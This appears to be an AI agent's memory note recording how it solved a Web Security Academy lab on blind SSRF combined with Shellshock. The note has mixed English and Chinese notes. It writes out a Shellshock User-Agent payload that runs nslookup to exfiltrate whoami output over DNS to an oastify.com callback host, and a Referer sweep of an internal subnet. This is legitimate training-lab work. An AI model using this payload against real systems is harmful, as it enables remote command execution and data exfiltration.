---
metadata:
  node_type: memory
name: "Lab arm-A session: blind SSRF Shellshock"
description: "arm-A lab-shellshock: DNS exfil OK (peter-65ykUb @192.168.0.52) but solve needs POST /submitSolution answer"
last_updated: 2026-10-10T13:23:03+08:00
created: 2026-10-10T13:11:41+08:00
---

Lab /web-security/ssrf/blind/lab-shellshock-exploitation (arm A, open-book).
- widget-lab-id D453C6B39EFC515EB918548D6FF29DDDE86D0D0361AB5453B626309DE0E3A958; launched instance https://0af7001b03714c01831ccd6300060005.web-security-academy.net/ (jar /tmp/cj1.json, reused:false).
- Vector: product page load fetches Referer URL (analytics), forwards User-Agent; internal server 192.168.0.X:8080 is a CGI whose bash is vulnerable to Shellshock -> `() { :; }; /usr/bin/nslookup <label>.oastify.com` exfiltrates whoami via DNS.
- Must use Burp Collaborator default public server (lab firewall blocks arbitrary external systems).

## 2026-10-10

结果: solved(banner_verdict solved_class=true, congrats_line "Congratulations, you solved the lab!")。
链路:
1. page_read lab 页取 widget-lab-id D453C6B3...A958;range_launch launch-url 起实例 0af7001b...(reused:false)。
2. burp_collab new 取 <label>.oastify.com(题面明示只能用 Collaborator 默认公共服务)。
3. 向量 = 商品页 GET /product?productId=1 携 Referer: http://192.168.0.{{V}}:8080 + User-Agent: () { :; }; /usr/bin/nslookup {{V}}.<label>.oastify.com;raw_matrix 模板 {{V}} 槽 x /tmp/ssrf_vals.txt(1-254)叉乘,后台 600s 跑完约 6 分钟(逐变体 TLS+Connection: close,无并发)。
4. burp_collab poll 读回 DNS 交互 prefix=52 → 内网靶 192.168.0.52:8080,Shellshock 已执行(读交互即消费,重复解析给出两条同 prefix 记录)。
5. 二次投递 /usr/bin/nslookup $(whoami).<新 label> → poll 得 prefix=peter-65ykUb(OS 用户名)。
6. 关键卡点:exfiltration 成功但 banner 仍 is-notsolved(两次重试,含"不 poll 让交互不被消费"对照,均无效)——本题判分不看 Collaborator 交互本身。
7. 破局:实例首页带 <button id='submitSolution' method='POST' path='/submitSolution' parameter='answer'>;POST /submitSolution --form answer=peter-65ykUb 返回 {"correct":true},随后 banner 翻 is-solved。
教训:academy 题面若给 /submitSolution 答案口,exfil 得到的目标串必须回填提交,回调本身不判分;banner_verdict 首访即判,不必猜。
工具:page_read → range_launch → burp_collab(new/poll) → raw_matrix({{V}} sweep,--quiet,后台) → http_session(post submitSolution) → banner_verdict。全程 HTTP 走件。
